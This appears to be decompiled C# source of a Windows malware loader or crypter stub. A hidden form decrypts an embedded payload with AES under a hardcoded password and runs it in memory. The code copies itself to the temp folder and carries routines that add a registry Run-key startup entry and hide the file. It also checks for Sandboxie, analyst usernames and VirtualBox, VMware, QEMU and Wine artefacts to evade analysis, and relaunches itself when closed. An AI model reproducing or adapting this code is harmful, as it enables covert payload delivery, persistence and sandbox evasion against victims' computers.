using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

public class PG : Form
{
	private static bool waited;

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).set_Visible(false);
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void delayTimer_Elapsed(object sender, ElapsedEventArgs e)
	{
		waited = true;
	}

	private void Closing(object sender, FormClosingEventArgs e)
	{
		Process.Start(Application.get_ExecutablePath());
	}

	public PG()
	{
		InitializeComponent();
		string text = "vbc.exe";
		switch (text.ToLower())
		{
		case "default browser":
			Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
			break;
		case "vbc.exe":
			Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
			break;
		case "notepad.exe":
			Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
			break;
		default:
			Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
			break;
		}
		bool flag = false;
		bool flag2 = false;
		byte[] array = null;
		array = RX.RM();
		array = AESDecrypt(array, "tkxpFwmPGFMOfVQHhSGVsHExD");
		Assembly assembly = AppDomain.CurrentDomain.Load(array);
		MethodInfo entryPoint = assembly.EntryPoint;
		object obj = assembly.CreateInstance(entryPoint.Name);
		object[] parameters = null;
		if (entryPoint.GetParameters().Length > 0)
		{
			object[] array2 = new object[1];
			string[] array3 = (string[])(array2[0] = new string[1]);
			parameters = array2;
		}
		entryPoint.Invoke(obj, parameters);
		string text2 = "%tmp%";
		if (text2 == "%appdata%")
		{
			text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + AppDomain.CurrentDomain.FriendlyName;
		}
		if (text2 == "%tmp%")
		{
			text2 = Path.GetTempPath() + AppDomain.CurrentDomain.FriendlyName;
		}
		if (!File.Exists(text2))
		{
			File.Copy(Application.get_ExecutablePath(), text2);
		}
		if (flag)
		{
			AddToStartup(text2);
		}
		if (flag2)
		{
			HideFile();
		}
	}

	public static bool IsSandbox(string startupPath)
	{
		StringBuilder stringBuilder = new StringBuilder();
		int length = 50;
		GetUserName(stringBuilder, ref length);
		if ((int)GetModuleHandle("SbieDLL.dll") != 0)
		{
			return true;
		}
		switch (stringBuilder.ToString().ToUpper())
		{
		case "CURRENTUSER":
			return true;
		case "SCHMIDTI":
			return true;
		case "MALWARE":
			return true;
		case "VIRUS":
			return true;
		case "SANDBOX":
			return true;
		case "USER":
			return true;
		default:
		{
			string text = startupPath.ToUpper();
			if (text == "C:\\FILE.EXE")
			{
				return true;
			}
			if (text.Contains("\\VIRUS"))
			{
				return true;
			}
			if (text.Contains("SANDBOX"))
			{
				return true;
			}
			if (text.Contains("SAMPLE"))
			{
				return true;
			}
			if ((int)FindWindow("Afx:400000:0", (IntPtr)0) != 0)
			{
				return true;
			}
			return false;
		}
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool GetUserName(StringBuilder sb, ref int length);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, IntPtr ZeroOnly);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern uint GetFileAttributes(string lpFileName);

	public static bool IsVM()
	{
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0232: Expected O, but got Unknown
		//IL_0237: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Expected O, but got Unknown
		//IL_023f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0245: Expected O, but got Unknown
		//IL_0261: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VBOX"))
		{
			return true;
		}
		if (regGet("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("VBOX"))
		{
			return true;
		}
		if (regGet("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX"))
		{
			return true;
		}
		if (regGet("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey")
		{
			return true;
		}
		if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != uint.MaxValue)
		{
			return true;
		}
		if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE"))
		{
			return true;
		}
		if (regGet("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey")
		{
			return true;
		}
		if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE"))
		{
			return true;
		}
		if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("VMWARE"))
		{
			return true;
		}
		if (regGet("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper()))
		{
			return true;
		}
		if (regGet("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("VMWARE"))
		{
			return true;
		}
		if (regGet("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("VMWARE"))
		{
			return true;
		}
		if (regGet("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\PROGRAM FILES\\VMWARE\\VMWARE TOOLS\\"))
		{
			return true;
		}
		if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != uint.MaxValue)
		{
			return true;
		}
		if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != uint.MaxValue)
		{
			return true;
		}
		if (GetProcAddress(GetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0)
		{
			return true;
		}
		if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("QEMU"))
		{
			return true;
		}
		if (regGet("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("QEMU"))
		{
			return true;
		}
		ManagementScope val = new ManagementScope("\\\\.\\ROOT\\cimv2");
		ObjectQuery val2 = new ObjectQuery("SELECT * FROM Win32_VideoController");
		ManagementObjectSearcher val3 = new ManagementObjectSearcher(val, val2);
		ManagementObjectCollection val4 = val3.Get();
		ManagementObjectEnumerator enumerator = val4.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val5 = (ManagementObject)enumerator.get_Current();
				if (!(((ManagementBaseObject)val5).get_Item("Description").ToString() == "VM Additions S3 Trio32/64"))
				{
					if (!(((ManagementBaseObject)val5).get_Item("Description").ToString() == "S3 Trio32/64"))
					{
						if (!(((ManagementBaseObject)val5).get_Item("Description").ToString() == "VirtualBox Graphics Adapter"))
						{
							if (!(((ManagementBaseObject)val5).get_Item("Description").ToString() == "VMware SVGA II"))
							{
								if (!((ManagementBaseObject)val5).get_Item("Description").ToString()!.ToUpper().Contains("VMWARE"))
								{
									if (((ManagementBaseObject)val5).get_Item("Description").ToString() == "")
									{
										return true;
									}
									continue;
								}
								return true;
							}
							return true;
						}
						return true;
					}
					return true;
				}
				return true;
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return false;
	}

	public static string regGet(string key, string value)
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key, writable: false);
		if (registryKey != null)
		{
			object value2 = registryKey.GetValue(value, "noValueButYesKey");
			if ((object)value2.GetType() == typeof(string))
			{
				return value2.ToString();
			}
			if (registryKey.GetValueKind(value) != RegistryValueKind.String && registryKey.GetValueKind(value) != RegistryValueKind.ExpandString)
			{
				if (registryKey.GetValueKind(value) == RegistryValueKind.DWord)
				{
					return Convert.ToString((int)value2);
				}
				if (registryKey.GetValueKind(value) == RegistryValueKind.QWord)
				{
					return Convert.ToString((long)value2);
				}
				if (registryKey.GetValueKind(value) == RegistryValueKind.Binary)
				{
					return Convert.ToString((byte[])value2);
				}
				if (registryKey.GetValueKind(value) == RegistryValueKind.MultiString)
				{
					return string.Join("", (string[])value2);
				}
				return "noValueButYesKey";
			}
			return value2.ToString();
		}
		return "noKey";
	}

	public static byte[] AESDecrypt(byte[] input, string Pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public void AddToStartup(string installpath_)
	{
		if (installpath_ == null || installpath_ == "")
		{
			installpath_ = Path.GetTempPath() + AppDomain.CurrentDomain.FriendlyName;
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("[startup-name]", installpath_);
	}

	public void HideFile()
	{
		FileInfo fileInfo = new FileInfo(Application.get_ExecutablePath());
		fileInfo.Attributes = FileAttributes.Hidden;
	}
}
